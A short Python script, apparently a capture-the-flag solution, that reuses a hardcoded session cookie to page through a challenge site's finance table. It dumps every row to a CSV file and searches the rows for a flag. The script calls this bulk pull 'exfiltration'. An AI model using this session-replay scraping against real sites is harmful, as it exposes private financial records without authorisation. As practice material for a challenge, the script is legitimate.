import requests
from bs4 import BeautifulSoup
import csv

BASE = "https://cybersecurity-space-fe-ores.chals.io"

# 🔴 Replace this with the exact cookie name & value from your browser
COOKIES = {
    "session": "eYPQkUy9qtfl-b8Jw9-0Ekcub_oYGxbJmZqOIRGU_10.mOWPHnxcsZzfCPWT3GPiqi1Flq8"
}

def get_records_from_page(page: int):
    params = {
        "page": page,
        "date": "",
        "name": "",
        "department": "",
        "amount": "",
    }
    r = requests.get(f"{BASE}/finance", params=params, cookies=COOKIES)
    r.raise_for_status()

    soup = BeautifulSoup(r.text, "html.parser")
    table = soup.find("table", class_="table")
    if not table:
        return []

    tbody = table.find("tbody")
    rows = []
    for tr in tbody.find_all("tr"):
        tds = [td.get_text(strip=True) for td in tr.find_all("td")]
        # Filter row has inputs instead of pure text, so we skip any row that's not exactly 4 plain values
        if len(tds) == 4 and not tds[0].startswith("202") and not tds[0].startswith("2024"):
            # Be generous: if you want, tweak this condition; or just check len(tds) == 4
            pass

    # Simpler/safer: re-parse and skip rows that contain <input> tags
    rows = []
    for tr in tbody.find_all("tr"):
        # Skip filter row (it contains inputs)
        if tr.find("input"):
            continue
        tds = [td.get_text(strip=True) for td in tr.find_all("td")]
        if len(tds) == 4:
            rows.append(tds)

    return rows

def main():
    all_records = []
    page = 1

    while True:
        records = get_records_from_page(page)
        if not records:
            print(f"[!] No records found on page {page}, stopping.")
            break

        print(f"[+] Got {len(records)} records from page {page}")
        all_records.extend(records)
        page += 1

        # Safety: stop after some high number in case pages are infinite
        if page > 100:
            print("[!] Page limit reached, stopping.")
            break

    print(f"[+] Total records exfiltrated: {len(all_records)}")

    # Save to CSV for easier searching
    with open("finance_dump.csv", "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["Date", "Name", "Department", "Amount"])
        writer.writerows(all_records)

    # Look for the flag directly in-memory too
    for row in all_records:
        joined = " ".join(row)
        if "flag{" in joined:
            print("[!!!] FLAG FOUND IN ROW:", row)

if __name__ == "__main__":
    main()
